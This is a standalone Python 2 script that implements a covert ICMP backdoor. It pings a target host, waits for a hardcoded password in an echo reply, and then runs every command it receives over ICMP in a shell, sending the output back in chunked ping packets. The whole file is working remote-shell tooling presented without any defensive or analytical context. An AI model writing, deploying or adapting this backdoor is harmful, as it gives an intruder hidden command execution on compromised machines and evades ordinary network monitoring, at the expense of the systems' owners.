#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, string, time, subprocess

MY_ID = 1337
PASSWORD = "h4ck3r"
TARGET_IP = ""

def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def receive_one_ping(my_socket):
    i = 0
    while i != 5:
        i = i + 1
        whatReady = select.select([my_socket], [], [], 2)
        if whatReady[0] == []:
            continue
        recPacket, addr = my_socket.recvfrom(2048)
        icmpHeader = recPacket[20:28]
        type, code, checksum, packetID, sequence = struct.unpack("bbHHh", icmpHeader)
        if type == 0 and code == 0 and packetID == MY_ID:
            return addr[0], sequence, recPacket[28:]
    return None, None, None

def send_one_ping(my_socket, dest_addr, ID, seq, data):
    dest_addr = socket.gethostbyname(dest_addr)
    header = struct.pack("bbHHh", 0, 0, 0, ID, seq)
    my_checksum = checksum(header + data)
    header = struct.pack("bbHHh", 0, 0, socket.htons(my_checksum), ID, seq)
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))

if __name__ == "__main__":
    TARGET_IP = sys.argv[1]
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
        while (True):
            print "Sending ping, waiting for password..."
            send_one_ping(my_socket, TARGET_IP, MY_ID, MY_ID, "")
            target_ip_recv, sequence, data = receive_one_ping(my_socket)
            if target_ip_recv == TARGET_IP and data == PASSWORD:
                print "Backdoor activated..."
                curr_cwd = subprocess.Popen("pwd", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).stdout.read().splitlines()[-1]
                send_one_ping(my_socket, TARGET_IP, MY_ID, sequence+1, "BACKDOOR ACTIVE\nEnter commands...\n" + curr_cwd + " $ ")
                while (True):
                    target_ip_recv, sequence, data = receive_one_ping(my_socket)
                    if target_ip_recv == TARGET_IP:
                        if data == "EXIT1337":
                            break
                        print "Executing ", "cd " + curr_cwd + "; " + data + "; pwd"
                        try:
                            process = subprocess.Popen("cd " + curr_cwd + "; " + data + "; pwd", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                            stdoutput = process.stdout.read()
                            stderrput = process.stderr.read()
                            curr_cwd = stdoutput.splitlines()[-1]
                            output = '\n'.join(stdoutput.splitlines()[:-1]) + stderrput + "\n" + curr_cwd + " $ "
                        except Exception, e:
                            print "Error executing command: ", e
                            send_one_ping(my_socket, TARGET_IP, MY_ID, sequence+1, "Error executing command! Aborting shell")
                            break
                        while len(output) >= 2020:
                            send_one_ping(my_socket, TARGET_IP, MY_ID, sequence+1, output[0:2020])
                            output = output[2020:]
                        send_one_ping(my_socket, TARGET_IP, MY_ID, sequence+1, output)
            time.sleep(1)
    except socket.gaierror, e:
       print e[1]
    except KeyboardInterrupt:
       send_one_ping(my_socket, TARGET_IP, MY_ID, MY_ID, "EXIT1337")
       my_socket.close()
